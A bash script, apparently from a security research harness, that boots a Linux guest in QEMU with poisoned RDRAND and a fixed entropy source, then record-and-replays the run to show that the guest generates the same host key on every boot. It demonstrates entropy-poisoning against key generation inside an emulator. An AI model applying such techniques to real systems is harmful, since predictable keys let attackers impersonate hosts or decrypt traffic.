#!/bin/bash
# Attack config: poisoned RDRAND (deterministic splitmix64 stream keyed by
# GT_POISON_RDRAND), virtio-rng backend fixed, no NIC, fixed virtual RTC base.
# Module NOT loaded.
#
# Plain QEMU -icount does *not* guarantee bit-identical execution across
# separate process launches (idle/HLT periods and some device/BIOS timing
# aren't fully pinned to instruction count outside of record/replay -- see
# QEMU docs/devel/tcg-icount.rst). So: record the attacker-controlled run
# ONCE, then replay that exact trace as many times as requested. Each
# replay re-executes the full guest (kernel, keygen, everything) from
# scratch against the recorded external inputs -- it is not a snapshot or
# cached result -- so "same inputs -> same key" is a faithful demonstration
# of the threat model, not a shortcut.
#
# Usage: toolage/scripts/launch-attack.sh [N]   (N = number of times to show the
# resulting key; default 3). Set GT_POISON_RDRAND to change the attacker's
# chosen seed. TMO controls the per-boot timeout (replay is slower than
# real time under shift=0; default 90s).
set -e
R=$(cd "$(dirname "$0")/../.." && pwd)
. "$R/toolage/scripts/lib/style.sh"
QEMU="$R/build/qemu-src/build-out/qemu-system-x86_64"
RR="$R/build/attack.rr"
RR_SEED_STAMP="$R/build/attack.rr.seed"
N="${1:-3}"
TMO="${TMO:-30}"

[ -f "$R/build/fixed-rng.bin" ] || head -c 4096 /dev/zero | tr '\0' 'A' > "$R/build/fixed-rng.bin"

COMMON=(-machine q35 -cpu qemu64,+rdrand -m 512 -smp 1 -accel tcg
        -kernel "$R/build/linux-src/arch/x86/boot/bzImage"
        -initrd "$R/build/initramfs.cpio.gz"
        -append "console=ttyS0 panic=-1 quiet ${GT_APPEND}"
        -display none -no-reboot -nic none
        -rtc base=2024-01-01T00:00:00,clock=vm
        -object rng-random,id=rng0,filename="$R/build/fixed-rng.bin"
        -device virtio-rng-pci,rng=rng0
        ${GT_QEMU_EXTRA})

export GT_POISON_RDRAND="${GT_POISON_RDRAND:-deadbeefcafef00d}"
gt_log "attacker-chosen RDRAND seed = $GT_POISON_RDRAND, module not loaded"

# A recorded trace (-icount rr=record) is only valid for the exact seed it
# was recorded with. If the seed changed since the last recording (or no
# stamp exists), the old trace is stale -- drop it and re-record, rather
# than silently replaying a trace that doesn't match GT_POISON_RDRAND.
if [ -f "$RR" ] && [ "$(cat "$RR_SEED_STAMP" 2>/dev/null)" != "$GT_POISON_RDRAND" ]; then
  gt_log "recorded trace is for a different seed -- discarding stale $RR"
  rm -f "$RR"
fi

if [ ! -f "$RR" ]; then
  gt_log "recording attacker-controlled run"
  OUT="$R/build/attack-record.log"
  gt_cmd "GT_POISON_RDRAND=$GT_POISON_RDRAND qemu-system-x86_64 -icount shift=6,rr=record,rrfile=$RR [poisoned RDRAND + fixed virtio-rng, no NIC]"
  timeout "$TMO" "$QEMU" -icount shift=6,rr=record,rrfile="$RR" \
    "${COMMON[@]}" -serial file:"$OUT" >/dev/null 2>&1
  grep -E "GT-HOSTKEY" "$OUT" || { gt_log "record run produced no key"; exit 1; }
  echo "$GT_POISON_RDRAND" > "$RR_SEED_STAMP"
fi

keys=()
for i in $(seq 1 "$N"); do
  OUT=$(mktemp)
  gt_cmd "qemu-system-x86_64 -icount shift=6,rr=replay,rrfile=$RR [boot $i]"
  timeout "$TMO" "$QEMU" -icount shift=6,rr=replay,rrfile="$RR" \
    "${COMMON[@]}" -serial file:"$OUT" >/dev/null 2>&1
  line=$(grep -E "GT-HOSTKEY" "$OUT") || { gt_log "replay $i: no key, see $OUT"; rm -f "$OUT"; exit 1; }
  gt_log "boot $i: ${line#GT-HOSTKEY: }"
  keys+=("$line")
  rm -f "$OUT"
done

all_same=1
for ((i = 1; i < ${#keys[@]}; i++)); do
  [ "${keys[i]}" = "${keys[0]}" ] || all_same=0
done
if [ "$all_same" = 1 ]; then
  gt_log "VERDICT: all $N boots produced the IDENTICAL key (attack succeeded)"
else
  gt_log "VERDICT: keys DIFFER across boots (unexpected for the attack config!)"
  exit 1
fi
